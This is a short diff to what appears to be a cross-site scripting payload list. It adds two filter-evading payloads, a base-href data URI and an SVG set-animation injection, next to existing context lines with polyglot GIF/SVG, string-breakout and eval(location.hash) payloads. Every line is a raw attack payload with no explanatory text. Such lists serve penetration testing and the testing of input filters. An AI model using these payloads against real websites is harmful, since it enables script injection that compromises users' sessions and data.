@@ -1681,3 +1681,5 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 &apos;; alert(1);//
 <a href="#" onClick="var a ='foo&apos;; alert(1);//'">Click Me</a>
 <script>eval(location.hash.slice(1)</script>
+<base href=data:/,-alert(1)/>
+<svg><set href=#script attributeName=href to=data:,alert(1)/>
